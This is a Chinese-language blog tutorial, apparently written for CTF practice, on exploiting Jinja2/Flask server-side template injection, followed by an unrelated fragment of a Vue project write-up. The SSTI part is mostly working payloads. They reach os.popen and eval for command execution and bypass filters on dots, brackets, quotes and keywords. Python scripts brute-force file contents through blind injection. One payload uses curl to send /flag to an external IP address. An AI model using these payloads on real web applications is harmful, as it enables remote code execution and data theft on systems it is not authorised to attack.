我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0 执行如下： 12http://localhost/?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125; 得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象 os.popen 该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。 output = os.popen(‘cat /proc/cpuinfo’) print output.read() 于是我们构造最终的payload： 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir()&#x27;).read()&#125;&#125; 1.2 config以外的思路其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~ 12&#x27;&#x27;.__class__.__name__ #得到str()_.__class__.__name__ #tuple 这时引入base和mro的魔术方法 12bases : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）mro :类的父类，从父类网上找，最终会找到基类，所以mro[-1]等价于__bases__ 这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法 1__subclasses__ #获取所有的子类方法 之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有builtins，我们可以用这个去找eval： 12&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;) &#125;&#125; 补充思路： 1&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[&quot;catch_warnings&quot;].__init__.__globals__.__builtins__[&quot;eval&quot;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125; 1.3总结做题的思路：总而言之，我们要么去找builtins函数下的eval，要么去找os。 1str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C 2.谈谈过滤在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等 2.1 过滤了os，system等的情况在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过： 比如我们之前的payload修改成： 1?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125; 2.2 过滤了中括号这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775 Python的魔法方法__getitem__ 可以让对象实现迭代功能，这样就可以使用for...in... 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload： 1&#123;&#123; config.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() &#125;&#125; 利用request起步 1&#123;&#123; request.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(192).__init__.__globals__.__builtins__.__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 2.3 过滤了.号这个可以使用attr来进行绕过了，直接给出绕过方法： 所以之前的payload进行对比： 12345[].__class__ = []|attr(__class__)&#123;&#123;[]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)() &#125;&#125;&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[190] &#125;&#125; 1&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[192]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)|attr(__getitem__)(&#x27;eval&#x27;) &#125;&#125; 不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路 2.5利用request​ 因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的 这里翻阅到了一个老外思路，但是他没给全。 1http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;) &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init 利用request的思路去重新把payload拼出来 1?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() 2.4将中括号和.号都过滤情况下当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制 我们可以先写一个脚本： 123456789101112http://localhost/?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 之后为了绕过括号的限制，采用这种方法： 这里给出一个payload： 12345678910111213141516171819&#123;% for c in []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125; &#123;% if c|attr(request.headers.x4)==request.headers.x5 %&#125; &#123;%for d in ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125; &#123;%if d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif%&#125;&#123;% endfor %&#125; x13: x9: evalx8: __builtins__x7: __globals__x6: __init__x5: catch_warningsx4: __name__x3: __subclasses__x2: __base__x1: __class__ 2.6 过滤了单引号和双引号的情况在这种情况下，我们就只能去尝试查找各类的open函数了，没有办法执行命令了，于是查找到： 1self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read() 之后为了绕过引号的过滤，我们尝试使用request.args.x1的方式进行绕过 拼凑得： 2.7 读取文件1?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag 而实际上，我发现中括号也是可以进行替代的 1&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125;&amp;x1=eval 拼凑得出： 1&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir 2.8过滤了eval，popen，两个左花括号这里记录一下自己学习到的一道题目： 上海市网络安全大赛：123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home():__ name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) 这道题比较新有意思的点在两个地方： 过滤了这个地方： 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: 过滤了{ {} },这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下： 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; 如果满足条件，则会输出p0，否则就不会输出。第二点，我们该读取什么文件呢？ 这里运用了os.system(“rm -f /flag”) 默认的进程删除后会存放在暂时文件中，进程为： 1/proc/self/fd/3 故编写脚本如下： 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password) 脚本： 123456789101112131415161718import requests,stringurl = &quot;http://localhost:8080&quot;list = string.ascii_letters + string.digits+ &quot;-/_&#123;&#125;&quot;flag = &quot;&quot;for i in range(999): for j in list: payload = &#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;+str(i)+&quot;:&quot;+str(i+1)+&#x27;] == &quot;&#x27;+j+&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) data =&#123;&quot;id&quot;:payload&#125; res = requests.get(url,params=data).text # print(res) if &quot;~p0~&quot; in res: i+=1 flag+=j print(&quot;flag:&quot; + flag) break 还有一个： 12&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(233)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() 2.8过滤了空格，requestspayload基本没有变动，在这种情况下还被恶心了一下request，所以我们应该这样用： 原本正常的payload 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag 改造后： 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\\x20&#x2F;flag&quot;).read() &#125;&#125; 2.9利用{ %直接读取文件以前一直以为 是不能直接读取文件的，后面才发现： 1&#123;%print(config)%&#125; 这样就可以正常的输出语句 将下面这些： 1&#123;%print(a|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125; 第二种： 1&#123;%print(config|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125; 如果比赛环境中包含回显，其实也可以利用这么一个思路,查找catch_warnings： 1?name=&#123;%print(([]|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)())[169].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) )%&#125; hgame遇见的： 1&#123;%print(config|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[1:]&quot;))%&#125; 挨个十六进制 附上一个转十六进制的小脚本： 12345678910111213141516import binasciia = &quot;__globals__&quot;# print(h)for i in a : i = bytes(i,encoding=&quot;utf-8&quot;) i = binascii.b2a_hex(i) i = i.decode(&quot;ascii&quot;) i = str(i) i = i.replace(i,&quot;\\\\x&quot;+i) # i = i.replace(i,&quot;\\\\x&quot;+i) print(i,end=&quot;&quot;)# print(h) 在华为比赛中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 #! /usr/bin/env python#encoding=utf-8from flask import Flask,render_template,redirectfrom flask import requestimport urllibimport sysimport osfrom jinja2 import Templateapp = Flask(__name__)def safe_msg(msg): blacklist = [&#x27;~&#x27;,&#x27;set&#x27;,&#x27;or&#x27;,&#x27;args&#x27;,&#x27;_&#x27;,&#x27;[&#x27;,&#x27;request&#x27;,&#x27;lipsum&#x27;,&#x27;=&#x27;,&#x27;chr&#x27;,&#x27;json&#x27;,&#x27;g&#x27;,&#x27;.&#x27;,&quot;&#x27;&quot;,&#x27;&#123;&#123;&#x27;,&#x27;u&#x27;,&#x27;get&#x27;,&#x27; &#x27;,&#x27;,&#x27;,&#x27;*&#x27;,&#x27;^&#x27;,&#x27;&amp;&#x27;,&#x27;$&#x27;,&#x27;#&#x27;,&#x27;@&#x27;,&#x27;!&#x27;] for i in blacklist: if i in msg: return False return True@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/over&quot;, methods=[&#x27;GET&#x27;])def over(): return render_template(&#x27;over.html&#x27;)@app.route(&quot;/success&quot;, methods=[&#x27;GET&#x27;])def success(): msg = request.args.get(&quot;msg&quot;) if(msg == None): msg = &#x27;anonymous&#x27; if safe_msg(msg): t = Template(&quot;Good Job! &quot; + msg + &quot; . But sorry, there isn&#x27;t flag&quot;) else: t = Template(&quot;You look dangerous.....&quot;) return t.render(request=request)if __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;, port=8000) . But sorry, there isn&#x27;t flag 可以用十六进制绕过 1&#123;%print(a|attr(&quot;\\x5f\\x5finit\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f&quot;)|attr(&quot;\\x67\\x65\\x74&quot;)(&quot;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f&quot;)|attr(&quot;\\x67\\x65\\x74&quot;)(&quot;\\x65\\x76\\x61\\x6c&quot;)(&quot;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x22\\x6f\\x73\\x22\\x29\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x22\\x63\\x61\\x74\\x20\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x22\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29&quot;))%&#125; 除了十六进制，还有unicode可以进行绕过： 1&#123;%print(a|attr(&quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u0067\\u0065\\u0074&quot;)(&quot;\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u0067\\u0065\\u0074&quot;)(&quot;\\u0065\\u0076\\u0061\\u006c&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125; 2.10 格式化字符串新思路123456789101112131415161718192021222324import redef product(poc): payload = &#x27;&#x27; for chr in poc: model = &quot;&#x27;&#123;0:c&#125;&#x27;[&#x27;format&#x27;](%d)&quot; % ord(chr) payload += model + &#x27;+&#x27; return payload[:-1]a = product(&#x27;__builtins__&#x27;).replace(&#x27;+&#x27;, &quot;%2b&quot;)print(a)# &#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[65].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;def decode(payload): res = re.findall(&quot;\\(\\d+\\)&quot;, payload) for i in res: print(chr(int(i[1:-1])), end=&quot;&quot;)decode(a) 文章出处 2.11 过滤了flag反弹shell出去： 1()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(233)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&quot;eval&quot;)(&quot;getattr(__import__(&#39;os&#39;),&#39;system&#39;)(&#39;curl http:&#x2F;&#x2F;123.57.240.205:1234&#x2F;?a&#x3D;&#96;cat &#x2F;flag&#96;&#39;)&quot;) 123456789101112&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a =lipsum|lower|list|random%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a,item=b)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(bui=a,ltins=b)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set ch=dict(c=a,hr=b)|join %&#125;&#123;% set chr= (x|attr(geti))(ch) %&#125;&#123;% set a=(lipsum|attr(glo)).get(built) %&#125; 1234567891011121314151617181920212223242526272829&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a =lipsum|lower|list|random%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a,item=b)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(bui=a,ltins=b)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set ev=dict(ev=a,al=b)|join %&#125;&#123;% set eev= (x|attr(geti))(ev) %&#125;&#123;%set oo=(dict(o=a,s=b)|join)%&#125;&#123;% set or=dict(or=a,d=b)|join %&#125;&#123;% set ord= (x|attr(geti))(or) %&#125;&#123;% set ch=dict(c=a,hr=b)|join %&#125;&#123;% set cch= (x|attr(geti))(ch) %&#125;&#123;% set f=dict(F=a)|join%&#125;&#123;% set m=dict(m=a)|join%&#125;&#123;%set sin=cch(ord(m)-ord(f))%&#125;&#123;% set R=dict(R=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuoa=cch(ord(z)-ord(R))%&#125;&#123;% set Q=dict(Q=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuob=cch(ord(z)-ord(Q))%&#125;&#123;% set L=dict(L=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set dos=cch(ord(z)-ord(L))%&#125;&#123;% set arg=(a,a,dict(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dos,dict(sys=a,tem=b)|join,kuoa,sin,dict(who=a,ami=b)|join,sin,kuob)|join()%&#125;&#123;&#123;arg&#125;&#125;&#123;&#123; eev(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 1234567891011121314151617181920&#123;%%20set%20po=dict(po=a,p=a)|join%&#125;&#123;% set a =lipsum|lower|list|random%&#125;&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% set ge=(a,a,dict(ge=a,titem=b)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(bui=a,ltins=b)|join,a,a)|join()%&#125;&#123;%set di=(a,a,dict(di=a,ct=b)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(ge))(built)%&#125;&#123;%set ev=(dict(ev=a,al=b)|join)%&#125;&#123;%set fun=x|attr(ge)(ev)%&#125;&#123;%set f=(dict(fun=a,c=b)|join,a,dict(glo=a,bals=b)|join)|join()%&#125;&#123;%set linecache=(dict(line=a,cache=b)|join,a,dict(glo=a,bals=b)|join)|join()%&#125;&#123;%set oo=(dict(o=a,s=b)|join)%&#125;&#123;% set or=dict(or=a,d=b)|join %&#125;&#123;% set ord= (x|attr(ge))(or) %&#125;&#123;% set ch=dict(c=a,hr=b)|join %&#125;&#123;% set cch= (x|attr(ge))(ch) %&#125;&#123;% set f=dict(F=a)|join%&#125;&#123;% set m=dict(m=a)|join%&#125;&#123;%set sin=cch(ord(m)-ord(f))%&#125;&#123;% set R=dict(R=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuoa=cch(ord(z)-ord(R))%&#125;&#123;% set Q=dict(Q=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuob=cch(ord(z)-ord(Q))%&#125;&#123;% set L=dict(L=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set dd=cch(ord(z)-ord(L))%&#125;&#123;% set Z=dict(Z=a)|join%&#125;&#123;%set spa=cch(ord(z)-ord(Z))%&#125;&#123;% set K=dict(K=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set xie=cch(ord(z)-ord(K))%&#125;&#123;% set arg=(a,a,dict(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dd,dict(po=a,pen=b)|join,kuoa,sin,dict(env=a)|join,sin,kuob,dd,dict(rea=a,d=b)|join,kuoa,kuob)|join()%&#125;&#123;&#123;fun(arg)&#125;&#125;","categories":[],"tags":[{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]},{"title":"Vue总结","slug":"Vue总结","date":"2020-10-25T13:28:49.000Z","updated":"2020-11-17T06:08:39.740Z","comments":true,"path":"2020/10/25/Vue总结/","link":"","permalink":"http://example.com/2020/10/25/Vue%E6%80%BB%E7%BB%93/","excerpt":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么","text":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么 Vue我认为学下来就是很爽，基本上不用再各种去绑定JS当中的dom元素了（getElementById什么的） 其中基础源码，有一个index.html 1.index.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; 启动的时候有一个main.js，APP.vue等等。现在讲一下我是怎么做下来的，我利用到的框架是antdv，再package.json当中可以找到 2.package.json1234567891011121314151617181920212223242526272829303132&quot;dependencies&quot;: &#123; &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;, &quot;@antv/g2&quot;: &quot;^4.0.15&quot;, &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;, &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;, &quot;axios&quot;: &quot;^0.20.0&quot;, &quot;core-js&quot;: &quot;^3.6.5&quot;, &quot;echarts&quot;: &quot;^4.9.0&quot;, &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;, &quot;js-cookie&quot;: &quot;^2.2.1&quot;, &quot;jspdf&quot;: &quot;^2.1.1&quot;, &quot;less&quot;: &quot;^3.12.2&quot;, &quot;less-loader&quot;: &quot;^7.0.1&quot;, &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;, &quot;react&quot;: &quot;^16.13.1&quot;, &quot;react-dom&quot;: &quot;^16.13.1&quot;, &quot;react-window&quot;: &quot;^1.8.5&quot;, &quot;vant&quot;: &quot;^2.10.9&quot;, &quot;vue&quot;: &quot;^2.6.11&quot;, &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;, &quot;vue-router&quot;: &quot;^3.4.5&quot;, &quot;vuex&quot;: &quot;^3.5.1&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;, &quot;babel-eslint&quot;: &quot;^10.1.0&quot;, &quot;eslint&quot;: &quot;^6.7.2&quot;, &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot; &#125;, 要用的时候再项目根目录下cnpm -i即可。 讲一下路由该怎么做把，首先创建一个 3.router.js1234//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;; 在Vue当中，所有需要引用的东西需要用Vue.use之后才会生效 故我们构造之后的代码框架大致如下： 1234567891011121314151617//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;;Vue.use(VueRouter)//引用page1页面import upload from &#x27;./components/upload.vue&#x27;;import login from &#x27;./components/login.vue&#x27;;//定义routes路由的集合，数组类型const routes=[ //单个路由均为对象类型，path代表的是路径，component代表组件 &#123;path:&#x27;/upload&#x27;,component:upload&#125;, &#123;path:&#x27;/login&#x27;,component:login&#125;, 一个Vue文件的格式如下： 4.主入口123456789101112131415161718&lt;template&gt; &lt;div id&#x3D;&quot;app&quot;&gt; &lt;router-view&#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &#39;App&#39;, &#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; 在template当中构造HTML的代码，script当中构造当前页面的JS，而style设置中写css。如果不做限定，CSS将会是全局生效的！ 而APP作为主页面，只需要写一句话即可： 1&lt;router-view/&gt; 这一句话的意思代码将页面内容托管给Vue，根据vue的Router来显示内容 而Router的设置在main.js当中（实际上，几乎所有的设置都放在main.js当中进行统一设置） 1234new Vue(&#123; router, render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) 在main.js导入的模块可以全项目生效，如果想要普通的生效一个模块，这样构造： 123456789101112import &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal &#125; from &#x27;ant-design-vue&#x27;//在下面：Vue.use(Modal)Vue.use(Spin)Vue.use(Alert)Vue.use(Form)Vue.use(axios)Vue.use(htmlToPdf)Vue.use(Divider)Vue.use(Input)Vue.use(FormModel) 如果想要修改Vue默认的设置，例如我们导入axios的时候这样构造： 12import axios from &#x27;axios&#x27;Vue.prototype.$http = axios 之后我构造了一个公共使用的Vue模板，也就是菜单栏的插件，我是创建了一个commons文件夹，并写在里面 5.插槽12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;template&gt; &lt;a-layout id=&quot;components-layout-demo-side&quot; style=&quot;min-height: 100vh&quot;&gt; &lt;a-layout-sider v-model=&quot;collapsed&quot; width=&quot;12%&quot; collapsible&gt; &lt;div class=&quot;logo&quot; /&gt; &lt;a-menu theme=&quot;dark&quot; :default-selected-keys=&quot;[&#x27;1&#x27;]&quot; mode=&quot;inline&quot;&gt; 